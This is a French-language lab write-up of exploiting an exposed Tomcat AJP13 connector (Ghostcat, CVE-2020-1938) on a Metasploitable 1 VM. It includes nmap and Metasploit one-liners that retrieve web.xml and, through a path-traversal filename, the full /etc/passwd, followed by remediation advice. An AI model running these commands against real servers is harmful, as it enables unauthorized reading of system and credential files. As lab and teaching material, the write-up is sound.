# Write-up — AJP13 : lecture de fichiers arbitraires via le connecteur Tomcat (Metasploitable 1, port 8009)

Cible : `192.168.56.102` · Résultat : lecture arbitraire de fichiers (dont `/etc/passwd`),
**malgré une version de Tomcat a priori non couverte par la CVE officielle**.

> **Note réseau.** Je suis sur `vboxnet0` (cible `192.168.56.102`). Côté coéquipier (réseau
> `172.28.128.x`), remplacer l'IP — démarche identique.

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 8009 192.168.56.102
```
Sortie :
```
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
```
→ Le connecteur **AJP13** (Apache JServ Protocol) de Tomcat est exposé directement — ce même
Tomcat 5.5 déjà identifié sur le port 8180 (`tomcat.md`). Le connecteur AJP n'est **pas censé
être exposé publiquement** : il sert normalement à la communication interne entre un serveur
web (Apache/nginx) et Tomcat, pas à être accessible depuis l'extérieur.

Complément avec les scripts NSE dédiés :
```bash
nmap -p 8009 --script ajp-* 192.168.56.102
```
Sortie (extrait) — le script `ajp-request` parvient à récupérer du contenu via AJP sans
passer par le port HTTP 8180 :
```
| ajp-request:
| AJP/1.3 200 OK
| Content-Type: text/html;charset=ISO-8859-1
...
```
→ Déjà un premier signal : le connecteur répond et sert du contenu directement.

## 2. Vérifier l'hypothèse Ghostcat (CVE-2020-1938)

Le parcours suggère de vérifier si une variante de Ghostcat s'applique, tout en notant qu'elle
vise normalement des versions plus récentes. Vérification via la vraie source (pas de mémoire) :
```bash
msfconsole -q -x "info auxiliary/admin/http/tomcat_ghostcat; exit"
```
Sortie (extrait de la `Description`) :
```
In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped
with an AJP Connector enabled by default...
```
→ Plage officielle confirmée : **Tomcat 7.0.0 à 9.0.30** (branches 7.0/8.5/9.0). La cible est
en **Tomcat 5.5**, antérieure à toute cette plage. D'après la CVE officielle, **ça ne devrait
pas s'appliquer**.

## 3. Test quand même (et surprise)

Conformément à la méthodologie (vérifier plutôt que supposer), test effectif du module malgré
la version :
```bash
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; run; exit"
```
Sortie (extrait) :
```
<?xml version="1.0" encoding="ISO-8859-1"?>
...
<web-app xmlns="http://java.sun.com/xml/ns/j2ee" ...>
  <display-name>Welcome to Tomcat</display-name>
  ...
[+] 192.168.56.102:8009 - File contents save to: /home/josa/.msf4/loot/...web.xml....txt
```

⚠️ **Résultat surprenant.** Le module a bien récupéré `/WEB-INF/web.xml` — un fichier protégé,
normalement inaccessible depuis un navigateur HTTP classique — alors que la cible est une
version de Tomcat largement antérieure à la plage officiellement couverte par CVE-2020-1938.
Ce n'est pas un comportement "normal d'un outil" à passer sous silence : la doc du CVE dit
explicitement "7.0+", et pourtant ça marche sur 5.5.

Pour confirmer que ce n'est pas un hasard, test avec une traversée de chemin vers un fichier
hors de l'application web :
```bash
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; set FILENAME /../../../../../../etc/passwd; run; exit"
```
Sortie (extrait) :
```
root:x:0:0:root:/root:/bin/bash
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
...
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
...
```
→ **`/etc/passwd` entier récupéré**, confirmant une vraie lecture arbitraire de fichiers
système, pas limitée au webapp.

**Explication de l'écart avec la CVE officielle.** Le mécanisme sous-jacent (le connecteur AJP
traite les requêtes comme hautement fiables et résout le chemin demandé sans le restreindre
correctement) est probablement présent bien avant Tomcat 7.0 — la plage "7.0 à 9.0.30" de la
CVE officielle reflète ce qu'Apache a **testé et corrigé au moment de la divulgation en 2020**,
pas forcément la totalité des versions réellement affectées. Tomcat 5.5 était déjà en fin de
vie bien avant 2020 et n'a probablement jamais été audité pour cette CVE précise — d'où
l'absence du 5.5 dans la plage officielle malgré un comportement vulnérable équivalent.
Bonne leçon méthodologique : une plage de versions "officielle" décrit ce qui a été vérifié,
pas une garantie que les versions hors plage sont saines.

## 4. Preuve d'accès

```
Lecture de /WEB-INF/web.xml (fichier protégé)   → réussie
Lecture de /etc/passwd (hors webapp, traversal) → réussie, fichier système complet
```
→ Pas de shell direct, mais une primitive de **lecture arbitraire de fichiers** confirmée,
similaire en impact à ce qu'on a vu sur MySQL (`mysql.md`) — exfiltration de fichiers
sensibles, recoupement des comptes système déjà connus.

---

## Remédiation

- **Ne jamais exposer le connecteur AJP sur une interface publique** — c'est la cause racine,
  rappelée explicitement par la documentation Tomcat elle-même ("it was expected that this
  Connector would be disabled if not required"). Le limiter à `localhost` ou le désactiver si
  inutilisé.
- Mettre à jour Tomcat : la 5.5 est obsolète depuis longtemps et ce comportement montre qu'elle
  partage des faiblesses structurelles avec les versions officiellement vulnérables.
- Si le connecteur AJP est nécessaire (reverse proxy Apache/nginx en frontal), le protéger par
  un secret partagé (`requiredSecret`, disponible depuis les correctifs de 2020) et le
  restreindre par pare-feu aux seules IP du frontal.
- Ne pas se fier uniquement au numéro de version pour écarter une faille : tester activement
  quand c'est faisable, comme fait ici.

## Sources

- Session réelle (ce write-up) — recon, vérification de la plage CVE via la vraie source
  (`info` du module), test effectif malgré la non-correspondance apparente.
- `msfconsole -q -x "info auxiliary/admin/http/tomcat_ghostcat"` → description et plage de
  versions officielle (CVE-2020-1938).

**Suite du parcours MS1 :** DNS — BIND 9.4.2 (port 53), transfert de zone.
